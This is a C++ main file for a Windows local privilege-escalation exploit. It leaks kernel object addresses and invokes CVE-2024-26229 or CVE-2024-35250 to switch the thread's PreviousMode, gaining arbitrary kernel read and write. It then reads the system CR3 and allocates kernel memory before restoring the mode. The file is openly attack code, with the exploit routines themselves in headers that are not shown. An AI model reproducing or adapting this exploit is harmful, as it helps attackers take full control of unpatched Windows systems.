#include <Windows.h>
#include <iostream>
#include <string>
#include <winternl.h>
#include <stdint.h>
#include <vector>
#include <psapi.h>
#include <ntstatus.h>

#define __STREAMS__
#define _INC_MMREG
#include <strmif.h>
#include <ks.h>
#include <ksproxy.h>
#include <ksmedia.h>

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "Ksproxy.lib")
#pragma comment(lib, "ksuser.lib")

#include "ntdefs.h"
#include "utils.h"
#include "exploit.h"
#include "kforge.h"


int main()
{
    //
    // Leak System _EPROCESS kernel address
    // 
    uintptr_t SystemEProcess = GetKernelObject(4, (HANDLE)4);
    if (!SystemEProcess)
        return false;

    printf("[+] System EProcess: %p\n", (void*)SystemEProcess);

    //
    // Leak current _KTHREAD kernel address
    //
    uintptr_t CurrentKThread = GetCurrentKThread();
    if (!CurrentKThread)
        return false;

    printf("[+] Current KThread: %p\n", (void*)CurrentKThread);

    //
    // Leak current _EPROCESS kernel address
    //
    uintptr_t CurrentEProcess = GetCurrentEProcess();
    if (!CurrentEProcess)
        return false;

    printf("[+] Current EPROCESS: %p\n", (void*)CurrentEProcess);

    //
    // Abuse CVE-2024-26229 or CVE-2024-35250 exploit to switch PreviousMode for kernel permissions
    //
    if (!ObtainKernelExploitCSC(CurrentKThread))
    {
        if (!ObtainKernelExploitKS(CurrentKThread))
        {
            printf("[+] Failed both exploit methods...\n");
            return false;
        }
    }

    printf("[!] Obtained arbitrary kernel read/writes\n");

    //
    // Read the system cr3
    //
    uintptr_t SystemCr3 = 0;
    ReadKernelMemory(reinterpret_cast<PVOID>(SystemEProcess + 0x28), &SystemCr3, 0x8);

    printf("[!] SystemCr3: %p\n", (void*)SystemCr3);

    if (KF::Initialize())
    {
        auto KernelAllocation = KF::ExAllocatePool(NonPagedPoolNx, 0x1000);
        printf("[!] Allocated kernel memory: %p\n", (void*)KernelAllocation);
        KF::Cleanup();
    }

    //
    // Restoring KTHREAD->PreviousMode
    //
    uint8_t mode = 1;
    WriteKernelMemory(reinterpret_cast<PVOID>(CurrentKThread + KTHREAD_PreviousMode), reinterpret_cast<PVOID>(mode), 0x1);

    printf("[+] Press any key to exit...\n");

    getchar();

    return true;
}